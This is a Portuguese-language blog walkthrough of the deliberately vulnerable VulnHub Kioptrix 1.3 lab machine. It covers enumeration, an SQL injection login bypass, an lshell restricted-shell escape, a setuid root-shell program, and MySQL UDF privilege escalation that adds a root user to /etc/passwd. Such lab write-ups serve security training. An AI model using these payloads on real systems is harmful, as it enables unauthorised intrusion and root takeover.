---
title: "VulnHub - Kioptrix 1.3 #4"
tags: [Linux,Easy,Web,Gobuster,BurSuite,SQLInjection,Linpeas,Brute Force,UDF]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/inicial.png)

Link: [Kioptrix 1.3](https://www.vulnhub.com/entry/kioptrix-level-13-4%2C25/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 4 portas abertas no servidor

> Porta 22 -> SSH

> Porta 80 -> Web

> Portas 139 e 445 -> Samba

## Enumeração da Porta 445

```bash
smbmap -H 192.168.56.146
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/smb.png)

```bash
smbclient -L 192.168.56.146
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/smb1.png)

```bash
enum4linx -a 192.168.56.146
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/smb2.png)

Não conseguimos nada na porta 445, por enquanto.

## Enumeração da Porta 80

Acessamos a página web para verificar do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/web.png)

Gobuster nela

```bash
gobuster dir -u http://192.168.56.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/gobuster.png)

A única coisa que chamou atenção foi o fato de aparecer essas duas pastas `robert` e `john`, possivelmente são usuários da máquina

Acessando as páginas temos umas senhas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/john.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/john1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/robert.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/robert1.png)

Ambos redirecionam para a página login

Tentamos login admin:admin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/web1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/web2.png)

# SQLinjection

Agora tentamos login apenas uma ' (aspa)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/web4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/web5.png)

Opa, mensagem de erro, pode ser que tenhamos algum tipo de SQLInjection ai para explorar

Jogamos para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp1.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp2.png)

Vamos testando os parâmetros e descobrimos que o campo vulnerável é o `password`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp3.png)

Injetamos o payload correto (após testes) para bypassar o login

```
admin'OR '1'='1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp4.png)

Agora tentamos no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp6.png)

Bom, então tentamos com o usuário robert

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp8.png)

```
Username 	: 	robert
Password 	: 	ADGAdsafdfwt4gadfga==
```

Agora com o john

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/burp10.png)

```
Username 	: 	john
Password 	: 	MyNameIsJohn
```

Agora temos duas senhas! Vamos tentar ssh com elas

Robert

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ssh.png)

John

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ssh1.png)

Beleza, vamos escalar privilégio agora

Verificamos que ambos shells são **restritos**, então não podemos executar todos os comandos nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ssh2.png)

Tentamos escapar essa bash restrito com o `-t /bin/bash`, o `-t /bin/sh` e o `"bash --noprofile"`, e nenhum deu certo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ssh3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ssh4.png)

# Restricted Shell

Verificando o comando `help help` vemos que o shell restrito é o `lshell`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/help.png)

Pesquisamos por vulnerabilidades para ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/help1.png)

Encontramos um modo fácil de se escapar dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/help2.png)

https://www.aldeid.com/wiki/Lshell

```bash
echo os.system('/bin/bash')
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/help3.png)

Então escapamos!

John

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/help4.png)

Robert

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/help5.png)

# john -> root

Verificando na página web encontramos a senha do mysql, entramos nele e não conseguimos extrair nenhuma senha a mais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql2.png)

Contudo com o comando abaixo verificamos que o mysql está sendo executado como root, ou seja, podemos escalar privilégios por ai

```bash
ps -ef | grep mysql
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql3.png)

Verificamos a versão do mysql

```
Ver 14.12 Distrib 5.0.51a
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql4.png)

## 1º Tentantiva - Falha

Pesquisamos por exploits para ele, encontramos um exploit para UDF

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql5.png)

https://www.exploit-db.com/exploits/1518

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/sql6.png)

Criamos nosso `/tmp/setuid.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/set.png)

Compilamos e passamos ele para a máquina alvo, uma vez que não temos o gcc nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/set1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/set1.png)

Agora compilamos o exploit na nossa máquina, uma vez que não temos o gcc na máquina alvo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/udf.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/udf1.png)

Seguimos as instruções no exploitdb para explorar a vulnerabilidade

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/udf2.png)

Criamos a função que vai executar comandos

```
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/udf3.png)

Não conseguimos criar, vamos para o próximo exploit...

## 2º Tentativa - Sucesso

Agora com outro exploit vamos tentar escalar privilégio nessa máquina novamente

Aqui está o guia que utilizei para escalação, a ideia aqui é explorar o UDF (User Defined Function)

[Link 1](https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

[Link 2](http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/)

Seria necessário baixar a biblioteca necessária, contudo nessa máquina ela já está lá!

Caso precise baixar em outras máquinas, aqui está o link

https://github.com/mysqludf/lib_mysqludf_sys

Com o comando `whereis lib_mysqludf_sys.so` encontramos a biblioteca

/usr/lib/lib_mysqludf_sys.so

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/suc.png)

Entramos no mysql como root, tentamos criar a função pra executar comandos, mas ela já está criada, então executamos um id e jogamos a saida para o arquivo /tmp/out, e ai está

```
mysql -h localhost -u root
use mysql
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('id > /tmp/out; chown john.john /tmp/out');
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss.png)

Verificamos que o `setuid` não está com o setuid habilitado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss1.png)

Então habilitamos!

```
mysql -h localhost -u root
use mysql
select sys_exec('chmod u+s /tmp/setuid');
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss2.png)

Outro modo é adicionar um usuário no `/etc/passwd`

```
select sys_exec('echo "hacker:aaDUnysmdx4Fo:0:0:hacker:/root:/bin/bash" >> /etc/passwd);
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss3.png)

Agora entramos com ele

hacker:senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss4.png)

Pegamos a flag de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/root.png)

